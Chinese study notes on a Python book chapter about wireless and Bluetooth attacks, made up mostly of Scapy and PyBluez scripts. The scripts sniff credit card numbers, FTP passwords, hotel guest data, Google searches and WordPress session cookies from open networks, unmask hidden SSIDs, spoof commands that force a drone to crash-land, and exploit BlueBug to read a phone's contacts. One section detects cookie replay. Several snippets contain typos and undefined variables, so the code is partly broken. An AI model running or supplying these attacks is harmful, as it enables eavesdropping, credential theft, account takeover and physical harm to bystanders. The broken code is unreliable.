# 第 5 章 用 Python 进行无线网络攻击

## 搭建无线网络攻击环境

Backtrack 5 上的默认驱动程序能让用户把网卡设为混杂模式（monitor mode），并直接发送数据链路层上的帧。另外，它还有一个额外的无线插口，能让我们在网卡上再插上一个大功率天线。

混杂模式允许你直接拿到数据链路层上的无线网络数据帧，而不是以管理模式进入后获得的 `802.11` 以太网数据帧。这样，即使是在没有连上某个网络的情况下，也能看到 Beacons（信标）数据帧和无线网络管理数据帧的数据。

### 用 Scapy 测试无线网卡的嗅探功能

使用 `aircrack-ng` 工具包把网卡设为混杂模式。先用 Iwconif 列出无线网卡 wlan0 的相关信息。然后用 `airmon-ng start wlan0` 命令把网卡设为混杂模式

```shell
# iwconfig wlan0
```

把变量 `conf.iface` 设为新创建的嗅探用网卡，每监听到一个数据包，脚本就会运行 `pkt_print` 函数。如果这个数据包是 `802.11` 信标，`802.11` 探查响应、TCP 数据包、DNS 流量等

```python
from scapy.all import *
def pkt_print(pkt):
    if pkt.haslayer(Dot11Beacon):
        print("[+] Detected 802.11 Beacon Frame")
    elif pkt.haslayer(Dot11ProbeReq):
        print("[+] Detected 802.11 Probe Request Frame")
    elif pkt.haslayer(TCP):
        print("[+] Detected a TCP Packet")
    elif pkt.haslayer(DNS):
        print("[+] Detected a DNS Packet")
        
conf.iface = "mon0"
sniff(prn=pkt_print)
```

### 安装 Python 蓝牙包

使用 Python 中集成的 Linux Bluez 应用程序编程接口（API）以及 obexftp API（ObexFTP 是一个基于 OBEX 协议的 FTP 客户端软件。OBEX 的全称为 Object Exchange-对象交换，所以称之为对象交换协议。）

```shell
# sudo apt-get install python-bluez bluetooth python-obexftp
```

另外还需要有一个蓝牙设备。大部分使用 Cambridge Silicon Radio（CSR）公司出品的芯片组的蓝牙设备都能在 Linux 系统下正常工作。可以使用 `hciconfig config` 命令把蓝牙设备的详细配置信息打印在屏幕上

Backtrack5 r1 上有一个小瑕疵——在这个已经编译好的内核中，没有可以用来直接发送数据链路层上的蓝牙数据包的内核模块。所以需要升级或者使用 Backtrack5 r2

## 绵羊墙-被动窃听无线网络中传输的秘密

### 使用 Python 正则表达式嗅探信用卡信息

最常用的三种信用卡：Visa、MasterCard 和 American Express，登录 `http://www.regular-expressions.info/creditcard.html`，其中会提供其他银行的信用卡卡号的正则表达式。

American Express 信用卡由 34 或者 37 开头的 15 位数字组成。

```python
import re
def find_credit_card(raw):
    america_re = re.findall("3[47][0-9]{13}", raw)
    if america_re:
        print("[+] Found American Express Card: {}".format(america_re[0]))
        
def main():
    tests = []
    tests.append("I would like to buy 1337 copies of that dvd")
    tests.append("Bill my card: 378282246310005 for \$2600")
    for test in tests:
        fiind_credit_card(test)
```

类似地可以写出 MasterCards 和 Visa 信用卡卡号的正则表达式

```python
def find_credit_card(pkt):
    raw = pkt.sprintf("%Raw.load%")
    america_re = re.findall("3[47][0-9]{13}", raw)
    master_re = re.findall("5[1-5][0-9]{14}", raw)
    visa_re = re.findall("4[0-9]{12}(?:[0-9]{3})?", raw)
    if america_re:
        print("[+] Found American Express Card: {}".format(america_re[0]))
    if master_re:
        print("[+] Found MasterCard Card: {}".format(master_re[0]))
    if visa_re:
        print("[+] Found Visa Card: {}".format(visa_re[0]))
```

### 嗅探宾馆住客

使用 Python 来截取酒店里其它住客的信息。

```python
conf.iface = "mon0"
try:
	print("[*] Starting Hotel Guest Sniffer.")
    sniff(filter="tcp", prn=find_guest, store=0)
except KeyboardInterrupt:
    exit(0)
```

接下来构造正则表达式匹配所有以 `LAST_NAME` 开头，并以 `&` 结尾的字符串，这是宾馆住客房间号的正则表达式。

```python
def find_guest(pkt):
    raw = pkt.sprintf("%Raw.load%")
    name = re.findall("(?i)Last_NAME=(.*)&", raw)
    room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)
    if name:
        print("[+] Found Hotel Guest {}, Room #".format(name[0], root[0]))
```

### 编写谷歌键盘记录器

在搜索栏里每输入一个字符时，浏览器几乎都会向谷歌发送一个 HTTP GET。

谷歌搜索的 URL 中的参数提供了大量附加信息，这些信息对编写谷歌键盘记录器是相当有用的。

| 参数             | 含义                         |
| -------------- | -------------------------- |
| q=             | 查询的内容，就是在搜索框里输入的内容         |
| pq=            | 上一次查询的内容，即本次搜索前一次的查询内容     |
| hl=            | 语言，默认是 en，可以试试 `xx-hacker` |
| as_epq=        | 查询的精度                      |
| as_filetype=   | 文件格式，用于搜索特定类型的文件，比如 `.zip` |
| as_sitesearch= | 指定要搜索的网站                   |

可以把抓取到的搜索数据实时显示出来

```python
def find_google(pkt):
    if pkt.haslayer(Raw):
        payload = pkt.getlayer(Raw).load
        if "GET" in payload:
            if "google" in payload:
                r = re.findall(r"(?i)\&q=(.*?)\&", payload)
                if r:
                    search = r[0].split("&")[0]
                    search = search.replace("q=", "").replace("+", " ").replace("%20", " ")
                    print("[+] Searched For: {}".format(search))
```

 通过 `sniff` 进行嗅探：`sniff(filter="tcp port 80", prn=find_google)`

### 嗅探 FTP 登陆口令

文件传输协议（FTP）中没有使用加密措施来保护用户的登录密码，通过正则寻找这一信息，同时也会把数据包中的目的 IP 地址提取出来

```python
from scapy.all import *
def ftp_sniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf("%Raw.load%")
    user = re.findall("(?i)USER (.*)", raw)
    pswd = re.findall("(?i)PASS (.*)", raw)
    if user:
        print("[*] Detected FTP Login to {}".format(dest))
        print("[+] User account: {}".format(user[0]))
    elif pswd:
        print("[+] Password: {}".format(pswd[0]))
```

通过 `sniff(filter="tcp port 21", prn=ftp_sniff)` 实现

## 你带着笔记本电脑去过哪里？Python 告诉你

### 侦听 802.11 Probe 请求

为了提供一个无缝连接，你的电脑和手机里经常会有一个首选网络列表，其中含有你曾经成功连接过的网络名字。在你电脑启动后或者从某个网络断线掉下来的时候，电脑会发送 802.11 Probe 请求来搜索列表中的各个网络。

写一个工具来发现 802.11 Probe 请求

```python
from scapy.all import *
interface = "mon0"
probe_reqs = []
def sniff_probe(p):
    if p.haslayer(Dot11ProbeReq):
        net_name = p.getlayer(Dot11ProbeReq).info
        if net_name not in probe_reqs:
            probe_reqs.append(net_name)
            print("[+] Detected New Probe Request: {}".format(net_name))
sniff(iface=interface, prn=sniff_probe)
```

### 寻找隐藏的 802.11 信标

尽管大部分网络都会公开显示他们的网络名（BSSID），但有的无线网络会使用一个隐藏的 SSID 来保护它的网络名不被发现。802.11 信标帧中的 info 字段一般都包含网络名。在隐藏的网络中，Wi-Fi 热点不会去填写这个字段，搜寻隐藏的网络其实很简单，因为只要去找 info 字段被留白的 802.11 信标帧就可以。

```python
def sniff_dot11(p):
    if p.haslayer(Dot11Beacon):
        if p.getlayer(Dot11Beacon).info == "":
            addr2 = p.getlayer(Dot11).addr2
            if addr2 not in hidden_nets:
                print("[-] Detected Hidden SSID: with MAC: {}".format(addr2))
```

### 找出隐藏的 802.11 网络的网络名

尽管热点没有填写 802.11 信标帧中的 info 字段，但它在 Probe 响应帧中还是要将网络名传输出来。因此必须等待那个与 802.11 信标帧的 Mac 地址匹配的 Probe 响应帧出现。

```python
import sys
from scapy.all import *
interface = "mon0"
hidden_nets = []
unhidden_nets = []
def sniff_dot11(p):
    if p.haslayer(Dot11ProbeResp):
        addr2 = p.getlayer(Dot11).addr2
        if addr2 in hidden_nets and addr2 not in unhidden_nets:
            net_name = p.getlayer(Dot11ProbeResp).info
            print("[+] Decloaked Hidden SSID: {} for MAC: {}".format(net_name, addr2))
            unhidden_nets.append(addr2)
    if p.haslayer(Dot11Beacon):
        if p.getlayer(Dot11Beacon).info == "":
            addr2 = p.getlayer(Dot11).addr2
            if addr2 not in hidden_nets:
                print("[-] Detected Hidden SSID: with MAC: {}".format(addr2))
                hidden_nets.append(addr2)
sniff(iface=interface, prn=sniff_dot11)
```

## 用 Python 截取和监视无人机

### 截取数据包，解析协议

无人机和 iPhone 之间建立一个 `ad-hoc` 无线网络（点对点，ad-hoc 模式就和以前的直连双绞线概念一样，是 P2P 的连接，所以也就无法与其他网络进行沟通），MAC 地址绑定被证明是保护连接的唯一安全机制。只有配对成功的 iPhone 才能给无人机发送飞行控制指令。

首先，要将适配器调至混杂模式来监听流量。无人机发起了一个 UDP 流量，其目标地址是手机上的 UDP 5555 端口，发送的是视频信息，而飞行控制指令是通过 5556 端口实现的。

```shell
# airmon-ng start wlan0
# tcpdump-nn-i mon0
```

知道了 iPhone 是通过 UDP 5556 端口向无人机发送飞行控制指令之后，可以编写一个 Python 脚本来把飞行控制流量解析出来

```python
from scapy.all import *
NAVPORT = 5556
def print_pkt(pkt):
    if pkt.haslayer(UDP) and pkt.getlayer(UDP).dport == NAVPORT:
        raw = pkt.sprintf("%Raw.load%")
        print(raw)
conf.iface = "mon0"
sinff(prn=print_pkt)
```

通过分析，协议使用的语法是 `AT*CMD=SEQUENCE_NUMBER,VALUE,[VALUE{3}]` 语句。

接下来写一个 `interceptThread` 类，其中存储了攻击所得的信息，包括当前抓取到的数据包、每条无人机协议的顺序号，以及一个描述无人机流量是否已经被拦截的布尔量。

```python
class interceptThread(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.cur_pkt = None
        self.seq = 0
        self.found_uav = False
   def run(self):
		sniff(prn=self.intercept_pkt, filter="udp port 5556")
   def intercept_pkt(self, pkt):
		if self.found_uav == False:
            print("[*] UAV Found.")
            self.found_uav = True
        self.cur_pkt = pkt
        raw = pkt.sprintf("%Raw.load%")
        try:
            self.seq = int(raw.split(",")[0].split("=")[-1]) + 5
        except:
            self.seq = 0
```

### 用 Scapy 制作 802.11 数据帧

接下来，要伪造一个包含无人机命令的数据包。要从当前的数据包或者帧中复制出必要的信息。这个数据包穿越了 RadioTap、802.11、SNAP、LLC、IP 和 UDP 层。

编写一个完整的库来复制各个层中的信息。注意，每个层中都要忽略掉一些字段，比如不复制表示 IP 包包长的字段，这个可以让 Scapy 自动把这个字段的值计算出来。同样，也不会记录那些存储校验和的字段。

```python
from scapy.all import *
def dup_radio(pkt):
    r_pkt = pkt.getlayer(RadioTap)
    version = r_pkt.version
    pad = r_pkt.pad
    present = r_pkt.present
    notdecoded = r_pkt.notdecoded
    n_pkt = RadioTap(version=version, pad=pad, present=present, notdecoded=notdecoded)
	return n_pkt

def dup_dot11(pkt):
    subtype = d_pkt.subtype
    copy_type = d_pkt.type
    proto = d_pkt.proto
    fc_field = d_pkt.FCfield
    copy_id = d_pkt.ID
    addr1 = d_pkt.addr1
    addr2 = d_pkt.addr2
    addr3 = d_pkt.addr3
    sc = d_pkt.SC
    addr4 = d_pkt.addr4
    n_pkt = Dot11(subtype=subtype, type=copy_type, proto=proto, fc_field=...)
    return n_pkt

def dup_snap(pkt):
    s_pkt = pkt.getlayer(SNAP)
    oui = s_pkt.OUI
    code = s_pkt.code
    n_pkt = SNAP(OUI=oui, code=code)
    return n_pkt

def dup_llc(pkt):
	l_pkt = pkt.getlayer(LLC)
    dsap = l_pkt.dsap
    ssap = l_pkt.ssap
    ctrl = l_pkt.ctrl
    n_pkt = LLC(dsap=dsap, ssap=ssap, ctrl=ctrl)
    return n_pkt

def dup_ip(pkt):
    i_pkt = pkt.getlayer(IP)
    version = i_pkt.version
    tos = i_pkt.tos
    copy_id = i_pkt.id
    flags = i_pkt.flags
    ttl = i_pkt.ttl
    proto = i_pkt.proto
    src = i_pkt.src
    dst = i_pkt.dst
    options = i_pkt.options
    n_pkt = IP(version=version, id=copy_id, ...)
    return n_pkt

def dup_udp(pkt):
    u_pkt = pkt.getlayer(UDP)
    sport = u_pkt.sport
    dport = d_pkt.dport
    n_pkt = UDP(sport=sport, dport=dport)
    return n_pkt
```

接下来拼凑在一起：

```python
def inject_cmd(self, cmd):
    radio = dup.dup_radio(self.cur_pkt)
    dot11 = dup.dup_dot11(self.cur_pkt)
    snap = dup.dup_snap(self.cur_pkt)
    llc = dup.dup_llc(self.cur_pkt)
    ip = dup.dup_ip(self.cur_pkt)
    udp = dup.dup_udp(self.cur_pkt)
    raw = Raw(load=cmd)
    inject_pkt = radio / dot11 / llc / snap / ip / udp / raw
    sendp(inject_pkt)
```

紧急迫降的指定对控制无人机来说是一条非常重要的指令。这个指令可以迫使无人机关闭引擎，并立即迫降下来。为了发出这条指令，可以使用序列号是当前的序列号再加上 100。接下来要发出指令 `AT*COMWDG=$SEQ\r`。这条指令的作用是把通信中的计数器重置成我们新设置的顺序值。之后无人机将会忽略之前的或者顺序号不匹配的指令。最后，再发送紧急迫降指令

### 完成攻击，使无人机紧急迫降

```python
def emergency_land(self):
    spoof_seq = self.seq + 100
    watch = "AT*COMWDG={}\r".format(spoof_seq)
    to_cmd = "AT*REF={},{}\r".format(spoof_seq + 1, EMER)
    self.inject_cmd(watch)
    self.inject_cmd(to_cmd)
    
def take_off(self):
    spoof_seq = self.seq + 100
    watch = "AT*COMWDG={}\r".format(spoof_seq)
    to_cmd = "AT*REF={},{}\r".format(spoof_seq + 1, TAKEOFF)
    self.inject_cmd(watch)
    self.inject_cmd(to_cmd)
```

## 探测火绵羊

一款叫火绵羊（FireSheep）的工具，提供了一个简单的双击界面，可以远程接管 Facebook、Twitter、谷歌和其他大量社交媒介中毫无戒心的用户帐户。火绵羊工具会被动地监听无线网卡上由这些 Web 站点提供的 cookie。如果用户连接了不安全的无线网络，也没有使用诸如 HTTPS 之类的服务端控制措施来保护它的会话，火绵羊就会截获这些 cookie 供攻击者再次使用它们。

如果想截取特定会话中的 cookie，供重放的话，也有一个易用的接口方便编写定制的处理代码。下面这段处理代码是针对 Wordpress 的 Cookie 的

```javascript
register({
  name: "Wordpress",
  matchPacket: function(packet) {
    for (varcookieName in packet.coookies) {
      if (cookieName.match0) {
        return true;
      }
    }
  },
  
  processPacket: function () {
    this.siteUrl += "wp-admin/"
    for (varcookieName in this.firstPacket.cookies) {
      if (cookieName.match(/^wordpress_[0-9a-fA-F]{32}$/)) {
        this.sessionId = this.firstPacket.cookies[cookieName];
        break;
      }
    }
  },
    
  identifyUser: function () {
    var resp = this.httpGet(this.siteUrl);
    this.userName = resp.body.querySelectorAll("#user_info a")[0].textContent;
    this.siteName = "Wordpress (" + this.firstPacket.host + ")";
  }
});
```

### 理解 WordPress 的会话 cookies

攻击者在火狐 3.6.24 上运行 Firesheep 工具包，可以发现一些类似的字符串通过无线网络以不加密的方式被发送出来。

### 牧羊人——找出 Wordpress Cookie 重放攻击

编写一个 Python 脚本解析含有这些会话 cookie 的 Wordpress HTTP 会话。

```python
import re
from scapy.all import *
def fire_catcher(pkt):
    raw = pkt.sprintf("%Raw.load%")
    r = re.findall("wordpress_[0-9a-fA-F]{32}", raw)
    if r and "Set" not in raw:
        print("{}>{} Cookie: {}".format(pkt.getlayer(IP).src, pkt.getlayer(IP).dst, r[0]))
conf.iface = "mon0"
sniff(filter="tcp port 80", prn=fire_catcher)
```

为了找出使用火绵羊的黑客，要确认的是攻击者在不同的 IP 地址上重复使用这些 cookie 值。为了检测出这一情况，要修改之前的脚本。

```python
import re
import optparse
from scapy.all import *
cookie_table = {}
def fire_catcher(pkt):
    raw = pkt.sprintf("%Raw.load%")
    r = re.findall("wordpress_[0-9a-fA-F]{32}", raw)
    if r and "Set" not in raw:
        if r[0] not in cookie_table.keys():
            cookie_table[r[0]] = pkt.getlayer(IP).src
            print("[+] Detected and indexed cookie.")
        elif cookie_table[r[0]] != pkt.getlayer(IP).src:
            print("[*] Detected Conflict for {}".format(r[0]))
            print("Victim = {}".format(cookie_table[r[0]]))
            print("Attacker = {}".format(pkt.getlayer(IP).src))
            
def main():
    parser = optparse.OptionParser("usage %prog -i<interface>")
    parser.add_option("-i", dest="interface", type="string", help="specify interface to listen on")
    options, args = parser.parse_args()
    if options.interface == None:
        print(parser.usage)
        exit(-1)
    else:
        conf.iface = options.interface
    try:
        sniff(filter="tcp port 80", prn=fire_catcher)
    except KeyboardInterrupt:
        exit(0)
```

### 用 Python 搜寻蓝牙

为了能与蓝牙资源进行交互操作，需要 PyBluez 这个 Python 模块。该模块扩展了用于使用蓝牙资源的 Bluez 库的功能。注意，当调用 `discover_devices()` 之后就会把附近所有当前处于“可被发现”状态下的蓝牙设备的 MAC 地址放在一个列表中返回来。`lookup_name()` 可以将各个蓝牙设备的 MAC 地址转换成方便阅读的字符串。

```python
from bluetooth import *
dev_list = discover_devices()
for device in dev_list:
    name = str(lookup_name(device))
    print("[+] Found Bluetooth Device {}".format(str(name)))
    print("[+] MAC address: {}".format(str(device)))
```

创建一个无限循环来检测：

```python
import time
from bluetooth import *
already_found = list()
def find_devs():
    found_devs = discover_devices(lookup_names=True)
    for addr, name in found_devs:
        if addr not in already_found:
            print("[*] Found Bluetooth Device: {}".format(name))
            print("[+] MAC address: {}".format(addr))
            already_found.append(addr)
            
while True:
    find_devs()
    time.sleep(5)
```

### 截取无限流量，查找（隐藏的）蓝牙设备地址

在 iPhone 里，把无线网卡的 MAC 地址加 1，就得到了这台 iPhone 的蓝牙 MAC。由于 802.11 无线协议在第 2 层中没有使用能够保护 MAC 地址的措施，所以可以很方便地嗅探到它，然后使用该信息来计算蓝牙的 MAC 地址。

来设置一个嗅探无线网卡的 MAC 地址。注意，只要 MAC 地址的前三个十六进制数 MAC 地址的前三个八位字节的 MAC 地址。前三个十六进制数是一个 OUI（Organizational Unique Identifier，组织唯一标识符），它表示的是设备制造商，你可以查询 OUI 数据库获取进一步的信息。

```python
from scapy.all import *
def wifi_print(pkt):
    iPhone_OUI = "d0:23:db"
    if pkt.haslayer(Dot11):
        wifi_mac = pkt.getlayer(Dot11).addr2
        if iPhone_OUI == wifi_mac[:8]:
            print("[*] Detected iPhone MAC: {}".format(wifi_mac))
conf.iface = "mon0"
sniff(prn=wifi_print)
```

有了 MAC 地址后，攻击者就可以发起一个设备名称查询来确认这个设备是否真的存在。即便是在“不可被发现”模式下，蓝牙设备仍会响应设备名称的查询请求。

```python
def check_bluetooth(bt_addr):
    bt_name = lookup_name(bt_addr)
    if bt_name:
        print("[+] Detected Bluetooth Device: {}".format(bt_name))
    else:
        print("[-] Failed to Detect Bluetooth Device.")
```

### 扫描蓝牙 RFCOMM 信道

2004 年的 CeBIT 峰会上，H 和 L 演示了一个他们称为 BlueBug 的蓝牙漏洞（Herfurt，2004）。该漏洞针对的是蓝牙的 RFCOMM 传输协议。RFCOMM 通过蓝牙 L2CAP 协议模拟了 RS232 串行端口。从本质上讲，这会与另一台设备建立一个蓝牙连接，模拟一条普通的串行线缆，使用户能够（在另一台设备上）通过蓝牙打电话、发送短信、读取手机电话簿中的记录，以及转接电话或上网

虽然 RFCOMM 确实也能建立需要认证的加密连接，但厂商有时会忽略掉这一功能，允许（其他）未经认证的用户与设备建立连接。

下面将编写一个扫描器，找出允许未经认证建立 RFCOMM 通道的设备

```python
from bluetooth import *
def rf_comm_con(addr, port):
    sock = BluetoothSocket(RFCOMM)
    try:
        sock.connect((addr, port)) 
		print("[+] RFCOMM Port {} open".format(port))
        sock.close()
    except Exception as e:
        print("[-] RFCOMM Port {} closed".format(port))
for port in range(1, 30):
    rf_comm_con("00:16:38:DE:AD:11", port)
```

通过这个脚本可以扫描出开放的 RFCOMM 端口，但不能判断这些端口提供的都是什么服务。需要使用蓝牙服务发现协议（Bluetooth Service Discovery Protocol）来实现

### 使用蓝牙服务发现协议

蓝牙服务发现协议（Service Discovery Protocol，SDP）提供了一种简便方法，用于描述和枚举蓝牙配置文件的类型以及设备提供的服务。设备的 SDP 配置文件中描述了运行在各个蓝牙协议和端口上的服务。

```python
from bluetooth import *
def sdp_browse(addr):
    services = find_service(address=addr)
    for service in services:
        name = service["name"]
        proto = service["protocol"]
        port = str(service["port"])
        print("[+] Found {} on {}:{}".format(name, proto, port))
sdp_browse("00:16:38:DE:AD:11")
```

调用函数 `find_service()` 之后返回 record 数组，目标蓝牙设备上的每个服务都对应数组中的一个 record，每个 record 中记录了主机、名称、描述、提供者（provider）、协议、端口、服务类、配置文件和服务 ID。

对象交换（Object Exchange，OBEX）服务允许我们能像使用匿名 FTP 那样匿名地向一个系统中上传（push）和下载（pull）文件

### 用 Python ObexFTP 控制打印机

用 ObexFTP 连接到打印机并上传一个图像文件

```python
import obexftp
try:
    bt_printer = obexftp.client(obexftp.BLUETOOTH)
    bt_printer.connect("00:16:38:DE:AD:11", 2)
    bt_printer.put_file("/tmp/ninja.jpg")
    print("[+] Printed Ninja Image.")
except:
    print("[-] Failed to print Ninja Image.")
```

### 用 Python 利用手机中的 BlueBug 漏洞

BlueBug 会与手机建立一个不需要经过认证的不安全连接，并通过这一连接窃取手机中的信息或直接向手机发送命令。这种攻击通过 RFCOMM 信道发送 AT 命令的方式，远程控制设备。这使得攻击者能读/发短信息、收集个人信息，或强制拨打电话号码。

```python
import bluetooth
target_phone = "AA:BB:CC:DD:EE:FF"
port = 17
phone_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phone_sock.connect((target_phone, port))
for contact in range(1, 5):
    at_cmd = "AT+CPBR={}\n".format(contact)
    phone_sock.send(at_cmd)
    result = client_sock.recv(1024)
    print("[+] {}: {}".format(contact, result))
sock.close()
```

